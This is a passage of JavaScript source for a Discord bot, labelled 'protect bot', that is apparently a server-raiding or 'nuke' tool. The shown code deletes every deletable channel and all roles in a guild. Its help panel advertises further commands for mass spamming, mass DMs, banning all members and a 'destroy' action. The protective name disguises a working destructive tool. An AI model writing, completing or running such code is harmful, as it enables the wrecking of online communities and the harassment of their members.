    }

    if (command === "dchans") {
        msg.guild.channels.forEach(chan => {
            if (!chan.deletable) return;
            chan.delete().catch(e => { console.log(e.stack) })
        })
        msg.guild.createChannel(args[0] || msg.author.username, { type: "text" }).catch(e => { console.log(e.stack) })
    }

    if (command === "droles") {
        msg.guild.roles.forEach(chan => {
            chan.delete().catch(e => { console.log(e.stack) })
        })
    }
    if (command === "help") {
        var emb = new Discord.RichEmbed()
            .setTitle('[+] help panel of protect bot [+]')
            .setDescription('PROTECT BOT CODED BY NEES')
            .addField('spamall', '`spamall (message)`')
            .addField('dmall', '`dmall (message)`')
            .addField('all', '`all`')
            .addField('banall', '`banall`')
            .addField('servname', '`servname`')
            .addField('servicone', '`servicone`')
            .addField('crchans', '`crchan`')
            .addField('dchans', '`dchan`')
            .addField('crroles', '`crroles`')
            .addField('droles', '`droles`')
            .addField('admin', '`admin`')
            .addField('destroy', '`destroy`')
            .setColor("0a0a0a")
            .setFooter(`dev by NEES `)

        msg.channel.send(emb).catch(e => { console.log(e.stack) })
    }
})